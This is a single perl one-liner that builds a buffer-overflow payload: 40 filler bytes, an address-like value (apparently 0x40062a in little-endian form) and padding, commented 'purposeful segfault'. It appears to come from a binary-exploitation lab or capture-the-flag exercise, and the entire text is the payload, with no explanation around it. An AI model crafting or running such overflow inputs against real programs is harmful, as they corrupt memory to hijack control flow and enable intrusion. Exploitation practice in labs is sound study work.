perl -e 'print "A"x40 . "\x2a\x06\x40" . "\x00"x5 . "\xff"x8 . "\x00"x8 . "\x00"x8' #purposeful segfault
